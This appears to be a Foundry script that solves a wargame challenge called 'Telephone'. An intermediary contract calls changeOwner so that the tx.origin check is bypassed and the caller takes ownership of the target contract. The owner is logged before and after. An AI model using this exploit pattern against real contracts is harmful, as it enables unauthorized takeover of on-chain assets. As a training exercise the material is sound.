// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "src/challenge-04_Telephone/Telephone.sol";
import {Script, console} from "forge-std/Script.sol";

contract TelephoneAttacker {
    Telephone public telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}

contract TelephoneAttackScript is Script {
    function run() external returns (Telephone, TelephoneAttacker) {
        address telephoneAddress = vm.envAddress("TELEPHONE_ADDRESS");
        Telephone telephone = Telephone(telephoneAddress);

        vm.startBroadcast();

        TelephoneAttacker attacker = new TelephoneAttacker(telephoneAddress);
        console.log("Deployed TelephoneAttacker:", address(attacker));

        console.log("Telephone owner before attack:", telephone.owner());
        attacker.attack();

        vm.stopBroadcast();

        console.log("Telephone owner after attack:", telephone.owner());

        return (telephone, attacker);
    }
}
